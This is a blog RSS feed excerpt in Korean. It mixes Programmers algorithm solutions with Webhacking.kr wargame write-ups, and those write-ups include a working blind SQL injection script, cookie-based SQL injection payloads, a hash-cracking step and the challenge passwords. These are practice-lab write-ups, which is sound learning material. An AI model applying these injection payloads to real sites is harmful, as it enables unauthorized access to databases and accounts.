class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> salts:</span><br><span class="line">        salt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(item)):</span><br><span class="line">            salt += item[idx]</span><br><span class="line">        md5 = hashlib.md5()</span><br><span class="line">        md5.update((text + salt).encode())</span><br><span class="line">        md5Text = md5.hexdigest()</span><br><span class="line">        print(<span class="string">f&#x27;<span class="subst">&#123;md5Text&#125;</span> &gt;&gt;&gt; <span class="subst">&#123;text + salt&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cores = cpu_count()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>+<span class="number">1</span>):</span><br><span class="line">        salts = <span class="built_in">list</span>(itertools.permutations(<span class="built_in">list</span>(string.ascii_lowercase + string.punctuation), count))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">with</span> Pool(cores) <span class="keyword">as</span> p:</span><br><span class="line">            hashing1 = p.<span class="built_in">map</span>(saltFront, salts)</span><br><span class="line">            hashing2 = p.<span class="built_in">map</span>(saltEnd, salts)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-638.png"><br>나는 30분 정도 돌리고 있는데 시간이 너무 아까워서 다른 시도라도 해보자라는 생각에 guest/guest으로 계정을 만들고, guest의 해시를 복호화 사이트에 돌려보니 DB에 저장되어있었다.<br><br>코딩한 노력이 물거품이 되었다…..</p><p>Salt 값을 알았으니, admin의 hash를 구해서 복호화를 시키겠다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwPrint</span>(<span class="params">url:<span class="built_in">str</span></span>):</span></span><br><span class="line">    pw =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">32</span>+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> string.ascii_lowercase + string.digits:</span><br><span class="line">            data[<span class="string">&#x27;uuid&#x27;</span>] = <span class="string">f&quot;admin&#x27; and substr(pw, <span class="subst">&#123;idx&#125;</span>, 1)=&#x27;<span class="subst">&#123;s&#125;</span>&#x27;#&quot;</span></span><br><span class="line">            res = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Wrong password!&#x27;</span><span class="keyword">in</span> res.text:</span><br><span class="line">                pw += s</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        print(<span class="string">f&#x27;<span class="subst">&#123;idx&#125;</span>번째 완료 &gt;&gt;&gt;&#x27;</span>, pw)</span><br><span class="line">    print(<span class="string">&#x27;완료 &gt;&gt;&gt;&#x27;</span>, pw)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&#x27;https://webhacking.kr/challenge/bonus-2/index.php&#x27;</span></span><br><span class="line">    pwPrint(url)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-639.png"><br>해당 결과를 얻을 수 있었다.</p><p><img src="/images/pasted-640.png"><br>MD5를 복호화를 통해 admin의 비밀번호는 wow라는 것을 알 수 있었다.</p><p><img src="/images/pasted-642.png"><br>Admin으로 로그인을 하니, Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/06/Webhacking-kr-Old-22-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 키패드 누르기</title>
      <link>https://lrtk-coder.github.io/2021/06/06/Programmers-Level-1-%ED%82%A4%ED%8C%A8%EB%93%9C-%EB%88%84%EB%A5%B4%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/06/06/Programmers-Level-1-%ED%82%A4%ED%8C%A8%EB%93%9C-%EB%88%84%EB%A5%B4%EA%B8%B0/</guid>
      <pubDate>Sun, 06 Jun 2021 21:51:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;카카오-인턴-키패드-누르기&quot;&gt;&lt;a href=&quot;#카카오-인턴-키패드-누르기&quot; class=&quot;headerlink&quot; title=&quot;[카카오 인턴] 키패드 누르기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/c</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="카카오-인턴-키패드-누르기"><a href="#카카오-인턴-키패드-누르기" class="headerlink" title="[카카오 인턴] 키패드 누르기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/67256">[카카오 인턴] 키패드 누르기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>스마트폰 전화 키패드의 각 칸에 다음과 같이 숫자들이 적혀 있습니다.</p><p><img src="/images/pasted-623.png"></p><p>이 전화 키패드에서 왼손과 오른손의 엄지손가락만을 이용해서 숫자만을 입력하려고 합니다.<br>맨 처음 왼손 엄지손가락은 * 키패드에 오른손 엄지손가락은 # 키패드 위치에서 시작하며, 엄지손가락을 사용하는 규칙은 다음과 같습니다.</p><ol><li>엄지손가락은 상하좌우 4가지 방향으로만 이동할 수 있으며 키패드 이동 한 칸은 거리로 1에 해당합니다.</li><li>왼쪽 열의 3개의 숫자 1, 4, 7을 입력할 때는 왼손 엄지손가락을 사용합니다.</li><li>오른쪽 열의 3개의 숫자 3, 6, 9를 입력할 때는 오른손 엄지손가락을 사용합니다.</li><li>가운데 열의 4개의 숫자 2, 5, 8, 0을 입력할 때는 두 엄지손가락의 현재 키패드의 위치에서 더 가까운 엄지손가락을 사용합니다.<br><br> 4-1. 만약 두 엄지손가락의 거리가 같다면, 오른손잡이는 오른손 엄지손가락, 왼손잡이는 왼손 엄지손가락을 사용합니다.</li><li>순서대로 누를 번호가 담긴 배열 numbers, 왼손잡이인지 오른손잡이인 지를 나타내는 문자열 hand가 매개변수로 주어질 때, 각 번호를 누른 엄지손가락이 왼손인 지 오른손인 지를 나타내는 연속된 문자열 형태로 return 하도록 solution 함수를 완성해주세요.</li></ol><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>numbers 배열의 크기는 1 이상 1,000 이하입니다.</li><li>numbers 배열 원소의 값은 0 이상 9 이하인 정수입니다.</li><li>hand는 “left” 또는 “right” 입니다.</li><li>“left”는 왼손잡이, “right”는 오른손잡이를 의미합니다.</li><li>왼손 엄지손가락을 사용한 경우는 L, 오른손 엄지손가락을 사용한 경우는 R을 순서대로 이어붙여 문자열 형태로 return 해주세요.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">distance</span>(<span class="params">Lfinger, Rfinger, number</span>):</span></span><br><span class="line">    location = &#123;</span><br><span class="line">        <span class="number">1</span>: (<span class="number">1</span>, <span class="number">1</span>), <span class="number">2</span>: (<span class="number">2</span>, <span class="number">1</span>), <span class="number">3</span>: (<span class="number">3</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="number">4</span>: (<span class="number">1</span>, <span class="number">2</span>), <span class="number">5</span>: (<span class="number">2</span>, <span class="number">2</span>), <span class="number">6</span>: (<span class="number">3</span>, <span class="number">2</span>),</span><br><span class="line">        <span class="number">7</span>: (<span class="number">1</span>, <span class="number">3</span>), <span class="number">8</span>: (<span class="number">2</span>, <span class="number">3</span>), <span class="number">9</span>: (<span class="number">3</span>, <span class="number">3</span>),</span><br><span class="line">        <span class="string">&#x27;*&#x27;</span>: (<span class="number">1</span>, <span class="number">4</span>), <span class="number">0</span>: (<span class="number">2</span>, <span class="number">4</span>), <span class="string">&#x27;#&#x27;</span>: (<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    LXLocation = <span class="built_in">abs</span>(location[number][<span class="number">0</span>] - location[Lfinger][<span class="number">0</span>])</span><br><span class="line">    LYLocation = <span class="built_in">abs</span>(location[number][<span class="number">1</span>] - location[Lfinger][<span class="number">1</span>])</span><br><span class="line">    RXLocation = <span class="built_in">abs</span>(location[number][<span class="number">0</span>] - location[Rfinger][<span class="number">0</span>])</span><br><span class="line">    RYLocation = <span class="built_in">abs</span>(location[number][<span class="number">1</span>] - location[Rfinger][<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> LXLocation+LYLocation, RXLocation+RYLocation</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">numbers, hand</span>):</span></span><br><span class="line">    left = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>]</span><br><span class="line">    right = [<span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>]</span><br><span class="line">    </span><br><span class="line">    Lfinger = <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    Rfinger = <span class="string">&#x27;#&#x27;</span></span><br><span class="line">    </span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> numbers:</span><br><span class="line">        <span class="keyword">if</span> number <span class="keyword">in</span> left:</span><br><span class="line">            result += <span class="string">&#x27;L&#x27;</span></span><br><span class="line">            Lfinger = number</span><br><span class="line">        <span class="keyword">elif</span> number <span class="keyword">in</span> right:</span><br><span class="line">            result += <span class="string">&#x27;R&#x27;</span></span><br><span class="line">            Rfinger = number</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            LDistance, RDistance = distance(Lfinger, Rfinger, number)</span><br><span class="line">            <span class="keyword">if</span> LDistance &lt; RDistance:</span><br><span class="line">                result += <span class="string">&#x27;L&#x27;</span></span><br><span class="line">                Lfinger = number</span><br><span class="line">            <span class="keyword">elif</span> LDistance &gt; RDistance:</span><br><span class="line">                result += <span class="string">&#x27;R&#x27;</span></span><br><span class="line">                Rfinger = number</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> hand == <span class="string">&#x27;left&#x27;</span>:</span><br><span class="line">                    result += <span class="string">&#x27;L&#x27;</span></span><br><span class="line">                    Lfinger = number</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result += <span class="string">&#x27;R&#x27;</span></span><br><span class="line">                    Rfinger = number</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>넘버패드의 위치를 저장한 dict을 이용하여 거리를 측정을 하여, 결과를 내주었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/06/Programmers-Level-1-%ED%82%A4%ED%8C%A8%EB%93%9C-%EB%88%84%EB%A5%B4%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 다트 게임</title>
      <link>https://lrtk-coder.github.io/2021/06/05/Programmers-Level-1-%EB%8B%A4%ED%8A%B8-%EA%B2%8C%EC%9E%84/</link>
      <guid>https://lrtk-coder.github.io/2021/06/05/Programmers-Level-1-%EB%8B%A4%ED%8A%B8-%EA%B2%8C%EC%9E%84/</guid>
      <pubDate>Sat, 05 Jun 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1차-다트-게임&quot;&gt;&lt;a href=&quot;#1차-다트-게임&quot; class=&quot;headerlink&quot; title=&quot;[1차] 다트 게임&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1차-다트-게임"><a href="#1차-다트-게임" class="headerlink" title="[1차] 다트 게임"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/17682">[1차] 다트 게임</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>카카오톡에 뜬 네 번째 별! 심심할 땐? 카카오톡 게임별~</p><p><img src="/images/pasted-622.png"></p><p>카카오톡 게임별의 하반기 신규 서비스로 다트 게임을 출시하기로 했다. 다트 게임은 다트판에 다트를 세 차례 던져 그 점수의 합계로 실력을 겨루는 게임으로, 모두가 간단히 즐길 수 있다.<br>갓 입사한 무지는 코딩 실력을 인정받아 게임의 핵심 부분인 점수 계산 로직을 맡게 되었다. 다트 게임의 점수 계산 로직은 아래와 같다.</p><ol><li>다트 게임은 총 3번의 기회로 구성된다.</li><li>각 기회마다 얻을 수 있는 점수는 0점에서 10점까지이다.</li><li>점수와 함께 Single(S), Double(D), Triple(T) 영역이 존재하고 각 영역 당첨 시 점수에서 1제곱, 2제곱, 3제곱 (점수1 , 점수2 , 점수3 )으로 계산된다.</li><li>옵션으로 스타상(<em>) , 아차상(#)이 존재하며 스타상(</em>) 당첨 시 해당 점수와 바로 전에 얻은 점수를 각 2배로 만든다. 아차상(#) 당첨 시 해당 점수는 마이너스된다.</li><li>스타상(<em>)은 첫 번째 기회에서도 나올 수 있다. 이 경우 첫 번째 스타상(</em>)의 점수만 2배가 된다. (예제 4번 참고)</li><li>스타상(<em>)의 효과는 다른 스타상(</em>)의 효과와 중첩될 수 있다. 이 경우 중첩된 스타상(*) 점수는 4배가 된다. (예제 4번 참고)</li><li>스타상(*)의 효과는 아차상(#)의 효과와 중첩될 수 있다. 이 경우 중첩된 아차상(#)의 점수는 -2배가 된다. (예제 5번 참고)</li><li>Single(S), Double(D), Triple(T)은 점수마다 하나씩 존재한다.</li><li>스타상(*), 아차상(#)은 점수마다 둘 중 하나만 존재할 수 있으며, 존재하지 않을 수도 있다.</li></ol><p>0~10의 정수와 문자 S, D, T, *, #로 구성된 문자열이 입력될 시 총점수를 반환하는 함수를 작성하라.</p><h3 id="입력-형식"><a href="#입력-형식" class="headerlink" title="입력 형식"></a>입력 형식</h3><p>“점수|보너스|[옵션]”으로 이루어진 문자열 3세트.<br><br>예) 1S2D*3T</p><ul><li>점수는 0에서 10 사이의 정수이다.</li><li>보너스는 S, D, T 중 하나이다.</li><li>옵선은 *이나 # 중 하나이며, 없을 수도 있다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">dartResult</span>):</span></span><br><span class="line">    answer = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    bonus = &#123;<span class="string">&#x27;S&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;D&#x27;</span>:<span class="number">2</span>, <span class="string">&#x27;T&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">    p = re.<span class="built_in">compile</span>(<span class="string">&#x27;[0-9]+[SDT]&#123;1&#125;[#*]?&#x27;</span>)</span><br><span class="line">    results = p.findall(dartResult)</span><br><span class="line"></span><br><span class="line">    is_star = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> <span class="built_in">reversed</span>(results):</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            result_score = <span class="built_in">int</span>(result[<span class="number">0</span>:<span class="number">2</span>]) ** bonus[result[<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result_score = <span class="built_in">int</span>(result[<span class="number">0</span>]) ** bonus[result[<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> is_star:</span><br><span class="line">            result_score *= <span class="number">2</span></span><br><span class="line">            is_star = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">-1</span>] == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            result_score *= <span class="number">-1</span></span><br><span class="line">        <span class="keyword">elif</span> result[<span class="number">-1</span>] == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            result_score *= <span class="number">2</span></span><br><span class="line">            is_star = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        answer+=result_score</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure><p>정규표현식을 사용하여 주어진 문자열을 각 점수에 맞쳐서 나눠서 리스트화 시켰다.<br><br>여기서 포인트는 리스트화 시킨 것을 거꾸로 변환시켜서 for문을 돌린 것이다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> result[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    result_score = <span class="built_in">int</span>(result[<span class="number">0</span>:<span class="number">2</span>]) ** bonus[result[<span class="number">2</span>]]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    result_score = <span class="built_in">int</span>(result[<span class="number">0</span>]) ** bonus[result[<span class="number">1</span>]]</span><br></pre></td></tr></table></figure><p>보너스를 계산하기 위한 코드인데, 점수가 10일 경우를 고려하여 result(10S)의 2번째의 값이 0인 것을 검사하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> is_star:</span><br><span class="line">    result_score *= <span class="number">2</span></span><br><span class="line">    is_star = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> result[<span class="number">-1</span>] == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">    result_score *= <span class="number">-1</span></span><br><span class="line"><span class="keyword">elif</span> result[<span class="number">-1</span>] == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">    result_score *= <span class="number">2</span></span><br><span class="line">    is_star = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>예제 7번을 보면 *의 옵션은 2개까지만 적용하는 것을 볼 수 있다.<br><br>이 때문에 *가 나올 시, 곱하기 2와 is_star의 값을 True로 변경하였다.<br><br>다음 계산에선 <code>if is_star</code>를 통해 is_star가 True이면, 곱하기 2와 is_star를 False로 변경하여 다음 계산에서 곱하기를 하지 못하게 하였다.<br><br>위 로직을 통해 *이 나오면 2개를 곱하기 2하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/05/Programmers-Level-1-%EB%8B%A4%ED%8A%B8-%EA%B2%8C%EC%9E%84/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 2 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/03/Webhacking-kr-Old-2-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/03/Webhacking-kr-Old-2-Write-Up/</guid>
      <pubDate>Thu, 03 Jun 2021 23:41:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-2"><a href="#Old-2" class="headerlink" title="Old - 2"></a>Old - 2</h2><p><img src="/images/pasted-605.png"><br><img src="/images/pasted-606.png"><br>아무 반응이 없어서 코드를 확인해보니, 주석으로 시간과 admin 페이지가 표시되어 있었다.</p><p><img src="/images/pasted-607.png"><br>Admin 페이지에 들어가니,  비밀번호를 입력하는 Form이 있었다.<br><br>그래서 SQLi 문제인 듯하여, <code>&#39;</code>를 넣음으로써 Error를 일으켜서 Error를 출력하려고 했다.<br></p><p><img src="/images/pasted-608.png"><br>하지만, <code>&#39;</code> 포함하여 다양한 값들을 넣어지만 똑같은 Alert창이 출력되었다.</p><p>공격 백터가 Admin의 입력 Form이 아닌 듯하여, 다른 백터를 찾아봤다.</p><p><img src="/images/pasted-609.png"><br>쿠키를 보니 Time이라는 쿠키를 볼 수 있었다.</p><p><img src="/images/pasted-610.png"><br><img src="/images/pasted-611.png"><br>해당 쿠키값을 True로 변경하니, 주석으로 표시된 시간이 변경이 되었다.</p><p><img src="/images/pasted-612.png"><br><img src="/images/pasted-613.png"><br>이번에는 False로 변경하여 확인하니, 이번에도 시간이 변경되었다.<br><br>True와 False의 결과를 비교하니, 시간의 초 부분이 변경이 되었다.</p><p>그런데 보다가 True는 1이고, False는 0으로 출력되니 초가 1, 0이 출력되는 것이 아닐까? 라는 생각으로 이어졌다.</p><p><img src="/images/pasted-614.png"><br><img src="/images/pasted-615.png"><br>생각한 것이 적중했는지, 초 부분이 내가 입력한 값으로 변경되었다.<br><br>어떻게 작동되는지 궁금하여 인터넷에 “MYSQL 숫자에서 시간으로 변환”으로 검색하니,  FROM_UNIXTIME 함수를 알 수 있었다.</p><blockquote><p><a href="https://www.happycgi.com/community/bbs_detail.php?bbs_num=43&id=&tb=board_man_story">MYSQL 시간 관련 함수 정리 - happycgi</a></p></blockquote><p><img src="/images/pasted-616.png"><br>한번 써보니, 년도만 다르고 똑같이 나왔다.<br><br>그럼 SQLi은 <code>SELECT FROM_UNUXTIME( 쿠키값 )</code>으로 들어가게 된다.</p><p><img src="/images/pasted-617.png"><br>한번 FROM_UNUXTIME 함수 안에 쿼리를 삽입해보니, 잘 작동하였다.</p><p>나는 문제의 DB 테이블명과 컬럼명을 모르니, information_schma을 이용하여 알아보도록 하겠다.<br><img src="/images/pasted-618.png"><br><img src="/images/pasted-619.png"><br><code>(SELECT COUNT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA != &#39;mysql&#39; and TABLE_SCHEMA != &#39;information_schema&#39; and TABLE_SCHEMA != &#39;performance_schema&#39; and TABLE_SCHEMA != &#39;sys&#39;)=2)</code><br>이런식으로 계속 삽입하여 알아내면 되는데, 너무 오래걸릴 것 같아서 파이썬을 이용하여 SQLi 쿼리를 삽입하였다.</p><p><img src="/images/pasted-620.png"><br>해당 코드는 너무 대충 만들어서 보여주기가 민망하여, 코드는 공유하지 않겠다.<br><br>결과적으로 테이블은 admin_area_pw과 log가 나왔고, 각 컬럼의 수는 1개와 2개가 나왔다.</p><p>admin_area_pw의 컬럼은 pw가 나왔고, log의 컬럼은 ip, ip++가 나왔다.<br>데이터의 수는 각 1개씩 나와서, 데이터의 길이를 확인해보니 admin_area_pw의 pw의 데이터가 17글자가 나와서 그것을 타겟으로 출력해봤다.</p><p><img src="/images/pasted-621.png"><br>출력 결과인 <code>kudos_to_beistlab</code>을 admin 페이지의 입력 Form에 입력하여 서버로 보내니, Flag를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/03/Webhacking-kr-Old-2-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 크레인 인형뽑기 게임</title>
      <link>https://lrtk-coder.github.io/2021/06/03/Programmers-Level-1-%ED%81%AC%EB%A0%88%EC%9D%B8-%EC%9D%B8%ED%98%95%EB%BD%91%EA%B8%B0-%EA%B2%8C%EC%9E%84/</link>
      <guid>https://lrtk-coder.github.io/2021/06/03/Programmers-Level-1-%ED%81%AC%EB%A0%88%EC%9D%B8-%EC%9D%B8%ED%98%95%EB%BD%91%EA%B8%B0-%EA%B2%8C%EC%9E%84/</guid>
      <pubDate>Thu, 03 Jun 2021 17:33:24 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;크레인-인형뽑기-게임&quot;&gt;&lt;a href=&quot;#크레인-인형뽑기-게임&quot; class=&quot;headerlink&quot; title=&quot;크레인 인형뽑기 게임&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/l</description>
        
      
      
      
